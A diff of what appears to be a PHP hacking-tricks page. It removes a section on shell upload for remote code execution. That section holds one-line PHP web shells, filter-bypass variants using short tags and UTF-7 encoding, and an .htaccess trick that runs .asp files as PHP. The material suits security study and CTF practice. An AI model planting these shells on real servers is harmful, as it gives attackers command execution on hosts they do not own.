@@ -4,55 +4,6 @@ description: Some tricks specific to the PHP web programming language
 
 # PHP
 
-## Shell Upload (RCE)
-
-```php
-<?php system($_GET["cmd"]) ?>
-```
-
-Bypass `<?php` with alternative prefixes:
-
-<pre class="language-php"><code class="lang-php"><strong>&#x3C;?= system($_GET["cmd"]) ?>  // Universal (echo's result automatically)
-</strong>
-<strong>&#x3C;?system($_GET["cmd"])?>  // Supported on some servers
-</strong>
-<strong>&#x3C;script language="php">system($_GET["cmd"])&#x3C;/script>  // PHP &#x3C; 7
-</strong></code></pre>
-
-<pre class="language-php" data-title="Shortest (14-15 bytes)"><code class="lang-php">// Execute with /shell.php?0=id
-<strong>&#x3C;?=`$_GET[0]`;
-</strong>
-<strong>&#x3C;?=`$_GET[0]`?>ANYTHING
-</strong></code></pre>
-
-### .htaccess
-
-Upload `.htaccess` file to alter the directory, and bypass strong filters
-
-{% embed url="https://jorianwoltjer.com/blog/post/ctf/challenge-the-cyber-2022/file-upload-training-mission" %}
-Writeup of challenge that blocks any PHP extension or `<?` string
-{% endembed %}
-
-{% code title=".htaccess" %}
-```apacheconf
-# Allow .asp files to be served as PHP
-AddType application/x-httpd-php .asp
-# Set the encoding to UTF-7
-php_flag zend.multibyte 1
-php_value zend.script_encoding "UTF-7"
-```
-{% endcode %}
-
-{% code title="shell.asp" %}
-```
-+ADw-?php+ACA-system(+ACQ-+AF8-GET+AFs-+ACI-cmd+ACI-+AF0-)+ACA-?+AD4-
-```
-{% endcode %}
-
-{% embed url="https://github.com/wireghoul/htshells" %}
-Repository containing various tricks to get RCE using .htaccess files alone
-{% endembed %}
-
 ## Type Juggling
 
 When code uses `==` or `!=` instead of `===` or `!==` the user may use certain strings to do weird stuff with PHP converting strings to integers
